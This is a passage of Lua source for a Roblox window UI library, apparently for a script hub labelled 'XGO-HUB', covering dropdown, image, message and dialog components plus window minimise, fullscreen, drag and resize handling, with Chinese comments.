			ValueText.Text = (setup.Multi and Fconcat(setup.Default or {})) or tostring(setup.Default or "NONE");
			ValueText.TextColor3 = Library.Colors.TextColor
			ValueText.TextScaled = true
			ValueText.TextSize = 14.000
			ValueText.TextStrokeColor3 = Library.Colors.TextColor
			ValueText.TextStrokeTransparency = 0.950
			ValueText.TextWrapped = true

			Library:MakeDrop(DropdownBlock , UIStroke , Library.Colors.Hightlight)

			Library:MakeDrop(Block,UIStroke_2,Library.Colors.Hightlight);

			if setup.Tip then
				WindowLibrary:AddToolTip(DropdownBlock , tostring(setup.Tip));
			end;

			local UpdateSize = function()
				local size = Library:GetTextSize(ValueText.Text,ValueText.TextSize,ValueText.Font)
				pcall(function()
					Library:Tween(Block , Library.TweenLibrary.SmallEffect , {
						Size = UDim2.new(0, math.clamp(size.X + 15,75 , DropdownBlock.AbsoluteSize.X / 1.5), 0.600000024, 0)
					})
				end)
			end;

			local OnCallback = function(a)
				ValueText.Text = (setup.Multi and Fconcat(a)) or tostring(a);
				setup.Default = a;
				UpdateSize()
				setup.Callback(a)
			end;

			UpdateSize();

			Button.MouseButton1Click:Connect(function()
				UpdateSize();

				WindowLibrary:ClearDropdown();

				if setup.Multi then
					WindowLibrary:SetDropdownValues(0,setup.Values,{
						Info = setup.Default,
						Max = setup.MaxMulti;
					},OnCallback)
				else
					WindowLibrary:SetDropdownValues(1,setup.Values,setup.Default,OnCallback)
				end;

				WindowLibrary:OpenDropdown(Block);
			end)
			
			local UpdateBlock = function()
                local TitleSize = TextLabel.TextSize
                local MainSize = Library:GetTextSize(setup.Title, TitleSize, TextLabel.Font)
                local ContentSize = setup.Content:len() > 0 and Library:GetTextSize(setup.Content, Content.TextSize, Content.Font) or Vector2.new(0, 0)
        
                local TotalHeight = MainSize.Y + 10
                if setup.Content:len() > 0 then
                    Content.Visible = true
                    TotalHeight = TotalHeight + ContentSize.Y + 5 
                    TextLabel.Position = UDim2.new(0, 5, 0, 12)
                    TextLabel.Size = UDim2.new(1, 0, 0, 14)
                else
                    Content.Visible = false
                    TotalHeight = TotalHeight + 15.20000000000001
                    TextLabel.Position = UDim2.new(0.0199999996, 0, 0.5, 0)
                    TextLabel.Size = UDim2.new(1, 0, 0.400000006, 0)
                end

                DropdownBlock.Size = UDim2.new(0.99000001, 0, 0, TotalHeight)
            end
            UpdateBlock() -- 初始调用以设置正确的大小

			local RootSkid = {};

			function RootSkid:GetValue()
				return setup.Default;
			end;
			
			function RootSkid:Content(Setup)
                Content.Text = Setup
                UpdateBlock()
            end;

			function RootSkid:Value(SetupR)
				setup.Default = SetupR;
				ValueText.Text = (setup.Multi and Fconcat(SetupR)) or tostring(SetupR);
				setup.Default = SetupR;
				UpdateSize()
				setup.Callback(SetupR)
				UpdateBlock()
			end;

			function RootSkid:SetValue(data)
				setup.Values = data;
			end;

			function RootSkid:Visible(value)
				DropdownBlock.Visible = value;
			end;

			return RootSkid;
		end;
------ // 图像组件   ----------------------------------------------------------------------------------------
    	function Root:Image(setup)
			setup = setup or {};
			setup.Title = setup.Title or "图像";
			setup.Asset = setup.Asset or "rbxassetid://123698784885744";
			setup.Height = setup.Height or 120;

			local ImageBlock = Instance.new("Frame")
			local DropShadow = Instance.new("ImageLabel")
			local UIStroke = Instance.new("UIStroke")
			local Title = Instance.new("TextLabel")
			local ImageLabel = Instance.new("ImageLabel")

			ImageBlock.Name = "ImageBlock"
			ImageBlock.Parent = ScrollingFrame
			ImageBlock.BackgroundColor3 = Library.Colors.Default
			ImageBlock.BackgroundTransparency = 0.250
			ImageBlock.BorderColor3 = Color3.fromRGB(0, 0, 0)
			ImageBlock.BorderSizePixel = 0
			ImageBlock.Size = UDim2.new(0.99000001, 0, 0, 150)
			ImageBlock.ZIndex = 10

			DropShadow.Name = "DropShadow"
			DropShadow.Parent = ImageBlock
			DropShadow.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			DropShadow.BackgroundTransparency = 1.000
			DropShadow.Position = UDim2.new(0, -5, 0, -5)
			DropShadow.Size = UDim2.new(1, 10, 1, 10)
			DropShadow.ZIndex = 9
			DropShadow.Image = "rbxassetid://297694300"
			DropShadow.ImageColor3 = Color3.fromRGB(0, 0, 0)
			DropShadow.ImageTransparency = 0.500
			DropShadow.ScaleType = Enum.ScaleType.Slice
			DropShadow.SliceCenter = Rect.new(95, 103, 894, 902)
			DropShadow.SliceScale = 0.050

			UIStroke.Transparency = 0.850
			UIStroke.Color = Color3.fromRGB(156, 156, 156)
			UIStroke.Parent = ImageBlock

			Title.Name = "Title"
			Title.Parent = ImageBlock
			Title.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			Title.BackgroundTransparency = 1.000
			Title.BorderColor3 = Color3.fromRGB(0, 0, 0)
			Title.BorderSizePixel = 0
			Title.Position = UDim2.new(0, 5, 0, 5)
			Title.Size = UDim2.new(1, 0, 0, 14)
			Title.ZIndex = 11
			Title.Font = Enum.Font.Gotham
			Title.Text = setup.Title
			Title.TextColor3 = Library.Colors.TextColor
			Title.TextScaled = true
			Title.TextSize = 14.000
			Title.TextStrokeColor3 = Color3.fromRGB(191, 193, 195)
			Title.TextStrokeTransparency = 0.950
			Title.TextColor3 = Library.Colors.TextColor;
			Title.TextWrapped = true
			Title.TextXAlignment = Enum.TextXAlignment.Left

			ImageLabel.Parent = ImageBlock
			ImageLabel.AnchorPoint = Vector2.new(0.5, 0)
			ImageLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			ImageLabel.BackgroundTransparency = 1.000
			ImageLabel.BorderColor3 = Color3.fromRGB(0, 0, 0)
			ImageLabel.BorderSizePixel = 0
			ImageLabel.Position = UDim2.new(0.5, 0, 0, 23)
			ImageLabel.Size = UDim2.new(0.980000019, 0, 0, setup.Height)
			ImageLabel.ZIndex = 11
			ImageLabel.Image = setup.Asset
			ImageLabel.ScaleType = Enum.ScaleType.Fit

			if setup.Tip then
				WindowLibrary:AddToolTip(ImageBlock , tostring(setup.Tip));
			end;

			local update = function()
				if not WindowLibrary.Toggle then
					return;
				end

				Library:Tween(ImageBlock,Library.TweenLibrary.SmallEffect,{
					Size = UDim2.new(0.99000001, 0, 0, Title.AbsoluteSize.Y + 17 + ImageLabel.AbsoluteSize.Y)
				})
			end;

			update()

			MainFrame:GetPropertyChangedSignal('AbsoluteSize'):Connect(update)

			local RootSkid = {};

			function RootSkid:GetValue()
				return ImageLabel.Image;
			end;

			function RootSkid:Value(Setup,height)
				height = height or setup.Height;
				ImageLabel.Image = Setup
				ImageLabel.Size = UDim2.new(0.980000019, 0, 0, height)

				update()
			end;

			function RootSkid:Visible(value)
				ImageBlock.Visible = value;
			end;

			return RootSkid;
		end;

		return Root;
	end;
	do
		local Black = Instance.new("Frame")

		Black.Name = "Black"
		Black.Parent = MainFrame
		Black.AnchorPoint = Vector2.new(0.5, 0.5)
		Black.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		Black.BackgroundTransparency = 1--0.550
		Black.BorderColor3 = Color3.fromRGB(0, 0, 0)
		Black.BorderSizePixel = 0
		Black.Position = UDim2.new(0.5, 0, 0.5, 0)
		Black.Size = UDim2.new(1, 0, 1, 0)
		Black.ZIndex = -25 --250
		Black.Active = true;

		local OpenBackground = function()
			Library:Tween(Black,Library.TweenLibrary.SmallEffect,{
				ZIndex = 250,
				BackgroundTransparency = 0.55
			})
		end;

		local CloseBackground = function()
			Library:Tween(Black,Library.TweenLibrary.SmallEffect,{
				ZIndex = -25,
				BackgroundTransparency = 1
			})
		end;

		function WindowLibrary:Message(setup)
			setup = setup or {};
			setup.Title = setup.Title or "Message";
			setup.Description = setup.Description or "Description";

			local Message = Instance.new("Frame")
			local DropShadow = Instance.new("ImageLabel")
			local UIStroke = Instance.new("UIStroke")
			local UIGradient = Instance.new("UIGradient")
			local Title = Instance.new("TextLabel")
			local Description = Instance.new("TextLabel")

			Message.Name = "Message"
			Message.Parent = Black
			Message.Active = true
			Message.AnchorPoint = Vector2.new(0.5, 0.5)
			Message.BackgroundColor3 = Color3.fromRGB(32, 33, 36)
			Message.BackgroundTransparency = 0.250
			Message.BorderColor3 = Color3.fromRGB(0, 0, 0)
			Message.BorderSizePixel = 0
			Message.Position = UDim2.new(0.5, 0, 0.5, 0)
			Message.Size = UDim2.new(0, 55, 0, 0)
			Message.ZIndex = 265
			Message.ClipsDescendants = true;

			DropShadow.Name = "DropShadow"
			DropShadow.Parent = Message
			DropShadow.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			DropShadow.BackgroundTransparency = 1.000
			DropShadow.Position = UDim2.new(0, -5, 0, -5)
			DropShadow.Rotation = 0.010
			DropShadow.Size = UDim2.new(1, 10, 1, 10)
			DropShadow.ZIndex = 264
			DropShadow.Image = "rbxassetid://297694300"
			DropShadow.ImageColor3 = Color3.fromRGB(0, 0, 0)
			DropShadow.ImageTransparency = 1
			DropShadow.ScaleType = Enum.ScaleType.Slice
			DropShadow.SliceCenter = Rect.new(95, 103, 894, 902)
			DropShadow.SliceScale = 0.050

			UIStroke.Transparency = 0.850
			UIStroke.Color = Color3.fromRGB(156, 156, 156)
			UIStroke.Parent = Message

			UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(255, 255, 255)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(209, 209, 209))}
			UIGradient.Rotation = 90
			UIGradient.Parent = Message

			Title.Name = "Title"
			Title.Parent = Message
			Title.AnchorPoint = Vector2.new(0.5, 0)
			Title.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			Title.BackgroundTransparency = 1.000
			Title.BorderColor3 = Color3.fromRGB(0, 0, 0)
			Title.BorderSizePixel = 0
			Title.Position = UDim2.new(0.5, 0, 0, 10)
			Title.Size = UDim2.new(0.899999976, 0, 0, 15)
			Title.ZIndex = 275
			Title.Font = Enum.Font.Gotham
			Title.Text = setup.Title
			Title.TextColor3 = Color3.fromRGB(220, 224, 234)
			Title.TextScaled = true
			Title.TextSize = 16.000
			Title.TextStrokeColor3 = Color3.fromRGB(220, 224, 234)
			Title.TextStrokeTransparency = 0.950

			Description.Name = "Description"
			Description.Parent = Message
			Description.AnchorPoint = Vector2.new(0.5, 0)
			Description.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			Description.BackgroundTransparency = 1.000
			Description.BorderColor3 = Color3.fromRGB(0, 0, 0)
			Description.BorderSizePixel = 0
			Description.Position = UDim2.new(0.5, 0, 0, 35)
			Description.Size = UDim2.new(0.899999976, 0, 0, 15)
			Description.ZIndex = 275
			Description.Font = Enum.Font.Gotham
			Description.Text = setup.Description
			Description.TextColor3 = Color3.fromRGB(220, 224, 234)
			Description.TextScaled = true
			Description.TextSize = 14.000
			Description.TextStrokeColor3 = Color3.fromRGB(220, 224, 234)
			Description.TextStrokeTransparency = 0.950
			Description.TextTransparency = 0.500

			OpenBackground();

			local Update = function()

				Library:Tween(DropShadow,Library.TweenLibrary.SmallEffect,{
					ImageTransparency = 0.25;
				})

				local DescriptionSize = Library:GetTextSize(Description.Text,Description.TextSize,Description.Font);
				local TitleSize = Library:GetTextSize(Title.Text,Title.TextSize,Title.Font);

				Description.Size = UDim2.fromOffset(DescriptionSize.X + 45 , DescriptionSize.Y + 6)
				Title.Size = UDim2.fromOffset(TitleSize.X + 5 , TitleSize.Y + 6)

				local MainX = ((TitleSize.X > DescriptionSize.X) and TitleSize.X) or DescriptionSize.X;


				Library:Tween(Message,Library.TweenLibrary.SmallEffect,{
					Size = UDim2.fromOffset(MainX + 35 , DescriptionSize.Y + 75 + TitleSize.Y),
					BackgroundTransparency = 0.250,

				});

				Library:Tween(UIStroke,Library.TweenLibrary.SmallEffect,{
					Transparency = 0.850
				})
			end;

			Update()

			local rfm = {};

			function rfm:Title(s)
				Title.Text = s;
				Update()
			end

			function rfm:Description(s)
				Description.Text = s;
				Update()
			end

			function rfm:Destroy(s)
				CloseBackground();

				Library:Tween(Message,Library.TweenLibrary.SmallEffect,{
					Size = UDim2.fromOffset(Message.AbsoluteSize.X - 25,0),
					BackgroundTransparency = 1,
				});

				Library:Tween(DropShadow,Library.TweenLibrary.SmallEffect,{
					ImageTransparency = 1;
				})

				Library:Tween(UIStroke,Library.TweenLibrary.SmallEffect,{
					Transparency = 1
				})

				task.delay(0.5,function()
					Message:Destroy()
				end)
			end

			return rfm
		end;
-----------------------------------框架-------------------------------------------------------------------------------------------------------------
		function WindowLibrary:Dialog(setup)
			if WindowLibrary.DialogStopTask then
				WindowLibrary.DialogStopTask();
			end;

			setup = setup or {};

			setup.Title = setup.Title or "\91\32\45\88\71\79\45\72\85\66\45\32\93";
            setup.Content = setup.Content or "\91\32\45\88\71\79\45\72\85\66\45\32\93"; -- 允许外部传入内容 -- 新增的子标题默认值
			setup.Buttons = setup.Buttons or {
				{
					Title = "是",
					Hightlight = true,
					Callback = function()

					end,
				},
				{
					Title = "否",
					Callback = function()

					end,
				}
			}

			OpenBackground();

			local Already = false;
			local AntiTouch = false;
			local Dialog = Instance.new("Frame")
			local DropShadow = Instance.new("ImageLabel")
			local UIStroke = Instance.new("UIStroke")
			local UIGradient = Instance.new("UIGradient")
			local Title = Instance.new("TextLabel")
            local Content = Instance.new("TextLabel") -- 新增的内容标签
			local Buttons = Instance.new("Frame")
			local UIListLayout = Instance.new("UIListLayout")

			Dialog.Name = "Dialog"
			Dialog.Parent = Black
			Dialog.AnchorPoint = Vector2.new(0.5, 0.5)
			Dialog.BackgroundColor3 = Library.Colors.Default
			Dialog.BackgroundTransparency = 1
			Dialog.BorderColor3 = Color3.fromRGB(0, 0, 0)
			Dialog.BorderSizePixel = 0
			Dialog.Position = UDim2.new(0.5, 0, 0.5, 0)
			Dialog.Size = UDim2.new(0.1, 250, 0.1, 100)
			Dialog.ZIndex = 265
			Dialog.Active = true

			Library:Tween(Dialog,Library.TweenLibrary.SmallEffect,{
				BackgroundTransparency = 0.250,
				Size = UDim2.new(0, 250, 0, 100)
			})

			DropShadow.Name = "DropShadow"
			DropShadow.Parent = Dialog
			DropShadow.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			DropShadow.BackgroundTransparency = 1.000
			DropShadow.BorderColor3 = Color3.fromRGB(27, 42, 53)
			DropShadow.Position = UDim2.new(0, -5, 0, -5)
			DropShadow.Rotation = 0.010
			DropShadow.Size = UDim2.new(1, 10, 1, 10)
			DropShadow.ZIndex = 264
			DropShadow.Image = "rbxassetid://297694300"
			DropShadow.ImageColor3 = Color3.fromRGB(0, 0, 0)
			DropShadow.ImageTransparency = 1
			DropShadow.ScaleType = Enum.ScaleType.Slice
			DropShadow.SliceCenter = Rect.new(95, 103, 894, 902)
			DropShadow.SliceScale = 0.050

			Library:Tween(DropShadow,Library.TweenLibrary.SmallEffect,{
				ImageTransparency = 0.500
			})

			UIStroke.Transparency = 1
			UIStroke.Color = Color3.fromRGB(156, 156, 156)
			UIStroke.Parent = Dialog

			Library:Tween(UIStroke,Library.TweenLibrary.SmallEffect,{
				Transparency = 0.850
			})

			UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(255, 255, 255)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(209, 209, 209))}
			UIGradient.Rotation = 90
			UIGradient.Parent = Dialog

			Title.Name = "Title"
			Title.Parent = Dialog
			Title.AnchorPoint = Vector2.new(0.5, 0)
			Title.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			Title.BackgroundTransparency = 1.000
			Title.BorderColor3 = Color3.fromRGB(0, 0, 0)
			Title.BorderSizePixel = 0
			Title.Position = UDim2.new(0.5, 0, 0.0649999976, 0)
			Title.Size = UDim2.new(0.899999976, 0, 0, 15)
			Title.ZIndex = 275
			Title.Font = Enum.Font.Gotham
			Title.Text = setup.Title;
			Title.TextColor3 = Library.Colors.TextColor
			Title.TextScaled = true
			Title.TextSize = 14.000
			Title.TextStrokeColor3 = Library.Colors.TextColor
			Title.TextStrokeTransparency = 1
			Title.TextWrapped = true
			Title.TextTransparency = 1
			Title.RichText = true

			Library:Tween(Title,Library.TweenLibrary.SmallEffect,{
				TextStrokeTransparency = 0.950,
				TextTransparency = 0
			})
            
            Content.Name = "Content"
            Content.Parent = Dialog
            Content.AnchorPoint = Vector2.new(0.5, 0)
            Content.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            Content.BackgroundTransparency = 1.000
            Content.BorderColor3 = Color3.fromRGB(0, 0, 0)
            Content.BorderSizePixel = 0
            Content.Position = UDim2.new(0.5, 0, 0.2000000059604645, 0)
            Content.Size = UDim2.new(0.899999976, 0, 0, 30)
            Content.ZIndex = 275
            Content.Font = Enum.Font.Gotham
            Content.Text = setup.Content; -- 使用外部传入的内容
            Content.TextColor3 = Library.Colors.TextColor
            Content.TextScaled = true
            Content.TextSize = 14.000
            Content.TextStrokeColor3 = Library.Colors.TextColor
            Content.TextStrokeTransparency = 1
            Content.TextWrapped = true
            Content.TextTransparency = 1
            Content.RichText = true

            Library:Tween(Content, Library.TweenLibrary.SmallEffect, {
                TextStrokeTransparency = 0.950,
                TextTransparency = 0
            })
            
            Buttons.Name = "Buttons"
			Buttons.Parent = Dialog
			Buttons.AnchorPoint = Vector2.new(0.5, 1)
			Buttons.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			Buttons.BackgroundTransparency = 1.000
			Buttons.BorderColor3 = Color3.fromRGB(0, 0, 0)
			Buttons.BorderSizePixel = 0
			Buttons.Position = UDim2.new(0.5, 0, 1, 0)
			Buttons.Size = UDim2.new(0.899999976, 0, 0, 50)
			Buttons.ZIndex = 275

			UIListLayout.Parent = Buttons
			UIListLayout.FillDirection = Enum.FillDirection.Horizontal
			UIListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
			UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder
			UIListLayout.Padding = UDim.new(0, 5)
			UIListLayout.Wraps = true

			Dialog.MouseEnter:Connect(function()
				AntiTouch = true
			end)

			Dialog.MouseLeave:Connect(function()
				AntiTouch = false
			end)

			local ListFunctions = {};
			local Thread = task.spawn(function()
				while true do game:GetService('RunService').Heartbeat:Wait()

					if #setup.Buttons <= 6 then
						Library:Tween(Buttons,Library.TweenLibrary.SmallEffect,{
							Size = UDim2.new(0,260,0,(UIListLayout.AbsoluteContentSize.Y + 25))
						})

						Library:Tween(Dialog,Library.TweenLibrary.SmallEffect,{
							Size = UDim2.new(0.05,265,0.05,Title.AbsoluteSize.Y + (Buttons.AbsoluteSize.Y) + 45)
						})
					else
						Library:Tween(Buttons,Library.TweenLibrary.SmallEffect,{
							Size = UDim2.new(0,350,0,(UIListLayout.AbsoluteContentSize.Y + 25))
						})

						Library:Tween(Dialog,Library.TweenLibrary.SmallEffect,{
							Size = UDim2.new(0.05,395,0.05,Title.AbsoluteSize.Y + (Buttons.AbsoluteSize.Y) + 45)
						})
					end;
				end;
			end)

			local Input;

			Input = Library.UserInputService.InputBegan:Connect(function(input , t)
				if (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) then

					if not AntiTouch then

						task.cancel(Thread);
						CloseBackground()
						table.foreach(ListFunctions,function(_,v) v() end)
						Input:Disconnect()
					end;
				end;
			end)

			table.insert(ListFunctions,function()
				Dialog.Active = false

				Library:Tween(Dialog,Library.TweenLibrary.SmallEffect,{
					BackgroundTransparency = 1,
					Size = UDim2.new(0.1, 250, 0.1, 100)
				})

				Library:Tween(DropShadow,Library.TweenLibrary.SmallEffect,{
					ImageTransparency = 1
				})

				Library:Tween(UIStroke,Library.TweenLibrary.SmallEffect,{
					Transparency = 1
				})
                -- 立即开始标题和内容标签的消失动画
				Library:Tween(Title,Library.TweenLibrary.SmallEffect,{
					TextStrokeTransparency = 1,
					TextTransparency = 1
				})

                Library:Tween(Content, Library.TweenLibrary.SmallEffect, {
                    TextStrokeTransparency = 1,
                    TextTransparency = 1
                })

				task.delay(1,function()
					Dialog:Destroy()
				end)
			end)


			WindowLibrary.DialogStopTask = function()
				Already = true;

				Input:Disconnect()
				task.cancel(Thread);
				CloseBackground()
				table.foreach(ListFunctions,function(_,v) v() end)
			end;

			for i,v in pairs(setup.Buttons) do
				v.Callback = v.Callback or function() end;
				v.Title = v.Title or "Button";

				local Frame = Instance.new("Frame")
				local UIStroke = Instance.new("UIStroke")
				local DropShadow = Instance.new("ImageLabel")
				local TextLabel = Instance.new("TextLabel")
				local Button = Instance.new("TextButton")

				Frame.Parent = Buttons
				Frame.BackgroundColor3 = Library.Colors.Default
				Frame.BorderColor3 = Color3.fromRGB(0, 0, 0)
				Frame.BorderSizePixel = 0
				Frame.Size = UDim2.new(0.469999999, 0, 0, 25)
				Frame.ZIndex = 285
				Frame.BackgroundTransparency = 1;

				if #setup.Buttons <= 6 then
					Frame.Size = UDim2.new(0.469999999, 0, 0, 25)
				else
					Frame.Size = UDim2.new(0, 100, 0, 25)
				end;

				Library:Tween(Frame,Library.TweenLibrary.SmallEffect,{
					BackgroundTransparency = 0.15
				})

				UIStroke.Transparency = 1
				UIStroke.Color = Color3.fromRGB(156, 156, 156)
				UIStroke.Parent = Frame

				Library:Tween(UIStroke,Library.TweenLibrary.SmallEffect,{
					Transparency = 0.850
				})

				DropShadow.Name = "DropShadow"
				DropShadow.Parent = Frame
				DropShadow.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
				DropShadow.BackgroundTransparency = 1.000
				DropShadow.BorderColor3 = Color3.fromRGB(27, 42, 53)
				DropShadow.Position = UDim2.new(0, -5, 0, -5)
				DropShadow.Rotation = 0.010
				DropShadow.Size = UDim2.new(1, 10, 1, 10)
				DropShadow.ZIndex = 284
				DropShadow.Image = "rbxassetid://297694300"
				DropShadow.ImageColor3 = Color3.fromRGB(0, 0, 0)
				DropShadow.ImageTransparency = 1
				DropShadow.ScaleType = Enum.ScaleType.Slice
				DropShadow.SliceCenter = Rect.new(95, 103, 894, 902)
				DropShadow.SliceScale = 0.050

				Library:Tween(DropShadow,Library.TweenLibrary.SmallEffect,{
					ImageTransparency = 0.500
				})

				TextLabel.Parent = Frame
				TextLabel.AnchorPoint = Vector2.new(0.5, 0.5)
				TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
				TextLabel.BackgroundTransparency = 1.000
				TextLabel.BorderColor3 = Color3.fromRGB(0, 0, 0)
				TextLabel.BorderSizePixel = 0
				TextLabel.Position = UDim2.new(0.5, 0, 0.5, 0)
				TextLabel.Size = UDim2.new(0.99000001, 0, 0.550000012, 0)
				TextLabel.ZIndex = 295
				TextLabel.Font = Enum.Font.Gotham
				TextLabel.Text = v.Title
				TextLabel.TextColor3 = Library.Colors.TextColor
				TextLabel.TextScaled = true
				TextLabel.TextSize = 14.000
				TextLabel.TextStrokeColor3 = Color3.fromRGB(220, 224, 234)
				TextLabel.TextStrokeTransparency = 1
				TextLabel.TextWrapped = true
				TextLabel.TextTransparency = 1
				TextLabel.RichText = true

				Library:Tween(TextLabel,Library.TweenLibrary.SmallEffect,{
					TextStrokeTransparency = 0.950,
					TextTransparency = 0
				})

				Button.Name = "Button"
				Button.Parent = Frame
				Button.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
				Button.BackgroundTransparency = 1.000
				Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
				Button.BorderSizePixel = 0
				Button.Size = UDim2.new(1, 0, 1, 0)
				Button.ZIndex = 350
				Button.Font = Enum.Font.SourceSans
				Button.TextColor3 = Color3.fromRGB(0, 0, 0)
				Button.TextSize = 14.000
				Button.TextTransparency = 1.000

				table.insert(ListFunctions,function()

					Library:Tween(TextLabel,Library.TweenLibrary.SmallEffect,{
						TextStrokeTransparency = 1,
						TextTransparency = 1,
						ZIndex = -10,
					})

					Library:Tween(DropShadow,Library.TweenLibrary.SmallEffect,{
						ImageTransparency = 1,
						ZIndex = -10,
					})

					Library:Tween(UIStroke,Library.TweenLibrary.SmallEffect,{
						Transparency = 1,

					})

					Library:Tween(Frame,Library.TweenLibrary.SmallEffect,{
						BackgroundTransparency = 1,
						ZIndex = -10,
					})

					Button.ZIndex = -100;
					Button.Visible = false;
					Button.Active = false

				end)

				if v.Hightlight then
					UIStroke.Color = Library.Colors.Hightlight;
				end;

				Library:MakeDrop(Frame,UIStroke,Library.Colors.Hightlight)

				Button.MouseButton1Click:Connect(function()
					if Already then
						return
					end

					WindowLibrary.DialogStopTask();

					v.Callback();
				end)

			end;
		end
	end;

	function WindowLibrary:GetRoot()
		return MainFrame;
	end;

	function WindowLibrary:Resize(udim : UDim2)
		Library:Tween(MainFrame , Library.TweenLibrary.SmallEffect,{
			Size = udim,
		});

		setup.Size = udim
	end;

	function WindowLibrary:Destroy()
		ScreenGui:Destroy();
		BlurEle.Destroy();
		return true;
	end;

	CloseButton.MouseButton1Click:Connect(function()
		WindowLibrary:Dialog({
			Title = "-- 你要关闭脚本吗 --",
			Content = "关闭后不会隐藏\n请选择",
			Buttons = {
				{
					Title = '执意关闭',
					Callback = function()
						Library:Tween(MainFrame , Library.TweenLibrary.SmallEffect,{
							Size = UDim2.fromScale(0,0),
							Position = UDim2.fromScale(0.5,0.5)
						}).Completed:Connect(function()
							task.wait()
							WindowLibrary:Destroy()
						end)
					end,
				},{
					Title = '稍后再来',
				}
			}
		})
	end)

	local ToggleButton = Library:InputButton(Ico);

	ToggleButton.Visible = false;

	local OnScreen = function()
		OpenDelay = tick();
		WindowLibrary.Toggle = true;
		ToggleButton.Visible = false;
		Library:Tween(Ico , Library.TweenLibrary.WindowChangedFast,{ImageTransparency = 1})
		Library:Tween(Block , Library.TweenLibrary.SmallEffect,{Position = UDim2.new(0.5, 0, 0.5, 0)})
		if WindowLibrary.FullScreen then
			WindowLibrary.Status = "FullScreen"
			Library:Tween(MainFrame , Library.TweenLibrary.SmallEffect,{
				Size = UDim2.fromScale(1,1),
				Position = UDim2.fromScale(0.5,0.5)
			})
			MaxisizweButton.HoverImage = 'rbxassetid://10734895530'
		else
			WindowLibrary.Status = 'Show'
			Library:Tween(MainFrame , Library.TweenLibrary.SmallEffect,{
				Size = setup.Size,
				Position = WindowLibrary.SavedPosition or UDim2.fromScale(0.5,0.5)
			})

			MaxisizweButton.HoverImage = 'rbxassetid://7733992901'
		end;
	end;

	MaxisizweButton.MouseButton1Click:Connect(function()
		WindowLibrary.FullScreen = not WindowLibrary.FullScreen;
		OnScreen()

	end)

	ToggleButton.MouseButton1Click:Connect(function()
		WindowLibrary.Toggle = true;

		ToggleButton.Visible = false;
		Library:Tween(Block , Library.TweenLibrary.WindowChangedFast,{Position = UDim2.new(0.5, 0, 0.5, 0)})
		Library:Tween(Ico , Library.TweenLibrary.WindowChangedFast,{ImageTransparency = 1})

		OnScreen()
	end)

	local Min = function()
		WindowLibrary.Toggle = not WindowLibrary.Toggle;

		if WindowLibrary.Toggle then

			ToggleButton.Visible = false;
			Library:Tween(Block , Library.TweenLibrary.SmallEffect,{Position = UDim2.new(0.5, 0, 0.5, 0)})
			Library:Tween(Ico , Library.TweenLibrary.SmallEffect,{ImageTransparency = 1})

			OnScreen()
		else
			OpenDelay = tick();
			ToggleButton.Visible = true;
			Library:Tween(Ico , Library.TweenLibrary.WindowChangedFast,{ImageTransparency = 0.25})

			Library:Tween(Block , Library.TweenLibrary.WindowChangedFast,{Position = UDim2.new(0.5, 0, -1.5, 0)})
			Library:Tween(MainFrame , Library.TweenLibrary.SmallEffect,{
				Size = Library.SizeLibrary.Close,
			})

			Library:Tween(MainFrame , Library.TweenLibrary.WindowChangedFast,{
				Position = UDim2.fromOffset(29,27)
			});
		end;
	end;

	MinimizeButton.MouseButton1Click:Connect(Min)

	local dragToggle = nil;
	local dragSpeed = 0.1;
	local dragStart = nil;
	local startPos = nil;

	local function updateInput(input)
		Library:Tween(MainFrame , Library.TweenLibrary.SmallEffect,{
			Size = setup.Size,
			Position = WindowLibrary.SavedPosition or UDim2.fromScale(0.5,0.5)
		});


		local delta = input.Position - dragStart;
		local position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X,
			startPos.Y.Scale, startPos.Y.Offset + delta.Y);

		if 	WindowLibrary.FullScreen then
			WindowLibrary.FullScreen = false;
			MainFrame.Position = position;
			startPos = position
		end;

		WindowLibrary.SavedPosition = position;

		game:GetService('TweenService'):Create(MainFrame, TweenInfo.new(dragSpeed), {Position = position}):Play()
	end;

	Headers.InputBegan:Connect(function(input)
		if (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) then 
			dragToggle = true
			dragStart = input.Position
			startPos = MainFrame.Position
			input.Changed:Connect(function()
				if input.UserInputState == Enum.UserInputState.End then
					dragToggle = false;
				end;
			end)
		end;
	end)

	Library.UserInputService.InputBegan:Connect(function(input,Istype)
		if input.KeyCode == setup.Keybind and not Istype then
			Min()
		end;
	end);

    local Resize = Instance.new("TextButton")
	local IsHold = false;

	Resize.Name = "Resize"
	Resize.Parent = MainFrame
	Resize.AnchorPoint = Vector2.new(0.5, 0.5)
	Resize.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	Resize.BackgroundTransparency = 1.000
	Resize.BorderColor3 = Color3.fromRGB(0, 0, 0)
	Resize.BorderSizePixel = 0
	Resize.Position = UDim2.new(1, 0, 1, 0)
	Resize.Rotation = 0.010
	Resize.Size = UDim2.new(1, 0, 1, 0)
--	Resize.Size = UDim2.new(0.075000003, 0, 0.075000003, 0)
	Resize.SizeConstraint = Enum.SizeConstraint.RelativeYY
	Resize.ZIndex = 100
	Resize.Font = Enum.Font.SourceSans
	Resize.Text = ""
	Resize.TextColor3 = Color3.fromRGB(0, 0, 0)
	Resize.TextSize = 14.000  

	local NotificationBar = Instance.new("Frame")
	local UIListLayout = Instance.new("UIListLayout")

